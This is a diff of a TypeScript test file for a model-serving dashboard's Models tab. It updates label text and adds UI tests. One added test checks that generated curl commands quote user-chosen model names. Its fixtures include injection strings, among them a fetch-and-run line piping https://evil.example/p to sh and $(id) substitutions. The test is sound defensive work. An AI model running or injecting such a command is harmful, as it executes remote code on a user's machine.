@@ -7,7 +7,7 @@ import type { CatalogModel, InferenceGatewayState, ModelExposureOption, ModelExp
 import { IDLE, modelsState } from "./featureState";
 import { cleanupBlocked, cleanupCandidates, cleanupSteps } from "./CleanupModal";
 import { envStatus } from "./resourceStatus";
-import { embeddingCurl, modelCurl, modelTokenLine, modelsConfirm, modelsSteps, thinkingCurl, toolCurl } from "./ModelsTab";
+import { UseModel, embeddingCurl, internalCurl, modelCurl, modelTokenLine, modelsConfirm, modelsSteps, thinkingCurl, toolCurl } from "./ModelsTab";
 
 const none: ResourceState = { deployed: false, ready: false, message: "Not deployed", managedByTool: false };
 const gateway: InferenceGatewayState = {
@@ -80,7 +80,7 @@ describe("modelsState", () => {
 
   it("ready opens the project in the dashboard; ownership is said apart from the label", () => {
     const s = modelsState(status({ inferenceGateway: { ...gateway, managedByTool: false }, models: modelsStatus({ items: [model("dev")] }) }), "dev", ["dev"]);
-    expect(s).toMatchObject({ status: "ready", label: "Ready in dev", unmanaged: true, next: { kind: "open", label: "Open in dashboard", href: "https://rh-ai.apps.example.com/ai-hub/models/deployments/internal/dev" } });
+    expect(s).toMatchObject({ status: "ready", label: "Ready in dev", unmanaged: true, next: { kind: "open", label: "Open models in the dashboard", href: "https://rh-ai.apps.example.com/ai-hub/models/deployments/internal/dev" } });
   });
 
   it("a cluster that cannot serve models says why on Set up", () => {
@@ -174,6 +174,32 @@ describe("Models runs and clean-up", () => {
       // One single-quoted body: no single quote inside it.
       expect(c.split("-d '")[1].slice(0, -1)).not.toContain("'");
     }
+  });
+
+  it("a served name a project editor chose cannot run anything when the commands are pasted", () => {
+    const base = "https://inference.apps.example.com/dev/m/";
+    const tok = "TOKEN=x";
+    const evil = [`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines"];
+    // A single-quoted shell word: '...' runs with '\'' inside; anything else outside quotes would be shell syntax.
+    const singleQuoted = /^'(?:[^']|'\\'')*'$/;
+    for (const name of evil) {
+      for (const c of [modelCurl(base, name, tok), embeddingCurl(base, name, tok), toolCurl(base, name, tok), thinkingCurl(base, name, tok), internalCurl(base, name, false), internalCurl(base, name, true)]) {
+        const word = c.slice(c.indexOf("-d ") + 3);
+        expect(word).toMatch(singleQuoted);
+        // Unquoted, the word is exactly the JSON body, with the name as its "model".
+        const body = word.slice(1, -1).replace(/'\\''/g, "'");
+        expect((JSON.parse(body) as { model: string }).model).toBe(name);
+      }
+    }
+    // Names in the token command: plain ones bare, anything else quoted.
+    expect(modelTokenLine("dev", model("dev", { tokenSecret: "default-name-x-sa" }))).toContain("oc get secret default-name-x-sa -n dev ");
+    expect(modelTokenLine("d$(id)", model("dev", { tokenSecret: "a'b" }))).toContain(`oc get secret 'a'\\''b' -n 'd$(id)' `);
+  });
+
+  it("a model whose served name the backend withholds shows no commands", () => {
+    render(<UseModel model={model("dev", { tokenSecret: "default-name-qwen25-05b-instruct-sa", servedNameWithheld: true })} project="dev" onMaaS={() => undefined} readOnly={false} baseReason={null} onSetUpAgain={() => undefined} />);
+    expect(screen.getByText(/There are no commands for this model/)).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: /copy/i })).toBeNull();
   });
 
   it("a project with several models: the Overview shows a problem of any of them", () => {
@@ -347,7 +373,7 @@ describe("Models tab", () => {
     // The recommended way is chosen, and said why.
     expect(await screen.findByRole("radio", { name: /Through the cluster's default inference gateway/ })).toBeChecked();
     expect(screen.getByRole("radio", { name: /Through MaaS only/ })).toBeDisabled();
-    expect(screen.getByText(/Recommended: Gateway openshift-ingress\/openshift-ai-inference is KServe's default/)).toBeInTheDocument();
+    expect(screen.getByText(/^Gateway openshift-ingress\/openshift-ai-inference is KServe.s default/)).toBeInTheDocument();
     fireEvent.click(screen.getByRole("button", { name: "Set up Qwen2.5 0.5B Instruct in dev" }));
     const dialog = await screen.findByRole("dialog", { name: /Set up Qwen2.5 0.5B Instruct in dev\?/ });
     expect(within(dialog).getByText(/Reached: through the cluster's default inference gateway/)).toBeInTheDocument();
@@ -405,8 +431,11 @@ describe("Models tab", () => {
     expect(within(part).getByText("Qwen2.5 0.5B Instruct is running but can't be called")).toBeInTheDocument();
     expect(screen.getByText("The last check got no answer; these commands will fail until it passes.")).toBeInTheDocument();
     expect(within(part).getByText(/^Checked /)).toBeInTheDocument();
-    // Check again changes nothing: it runs in place, without a dialog.
+    // Said once: the alert has the message and Check again; the row only the label and when.
+    expect(within(part).getAllByText(/Nothing answers at https:/)).toHaveLength(1);
     const buttons = within(part).getAllByRole("button", { name: "Check again" });
+    expect(buttons).toHaveLength(1);
+    // Check again changes nothing: it runs in place, without a dialog.
     fireEvent.click(buttons[buttons.length - 1]);
     await vi.waitFor(() => expect(api.bodies["POST /api/resources/models/stream"]).toEqual([{ action: "check", project: "dev", model: "qwen25-05b-instruct" }]));
     expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
@@ -556,13 +585,24 @@ describe("Models tab", () => {
     expect(api.bodies["POST /api/resources/models/stream"]).toEqual([{ action: "setup", project: "dev", model: "qwen25-05b-instruct", releasedImage: true }]);
   });
 
+  it("a preset image that may be missing offers the released image as a possibility", async () => {
+    stubApi({
+      "/api/resources/status": status({ inferenceGateway: gateway, models: modelsStatus({ items: [model("dev", { ready: false, terminalError: true, presetImageMissing: true, presetImageUncertain: true, waitingReason: "ImagePullBackOff", message: "ImagePullBackOff: unauthorized ... manifest unknown" })] }) }),
+      "/api/resources/projects": { projects: ["dev"] },
+    });
+    renderAt("/test-resources?tab=models&project=dev");
+    expect(await screen.findByText("The cluster preset's image may not be published")).toBeInTheDocument();
+    expect(screen.getByText(/either the image is not published or the node lacks the pull secret/)).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Use the newest released Red Hat image" })).toBeInTheDocument();
+  });
+
   it("the Overview lists Models with the same state as its tab", async () => {
     stubApi({ "/api/resources/status": status({ inferenceGateway: gateway, models: modelsStatus({ items: [model("dev")] }) }), "/api/resources/projects": { projects: ["dev"] } });
     renderAt("/test-resources");
     const table = await screen.findByRole("grid", { name: "Features" });
     const row = within(table).getByRole("link", { name: "Models" }).closest("tr")!;
     expect(within(row).getByText("Ready in dev")).toBeInTheDocument();
-    expect(within(row).getByRole("link", { name: "Open in dashboard" })).toBeInTheDocument();
+    expect(within(row).getByRole("link", { name: "Open models in the dashboard" })).toBeInTheDocument();
   });
 });
 
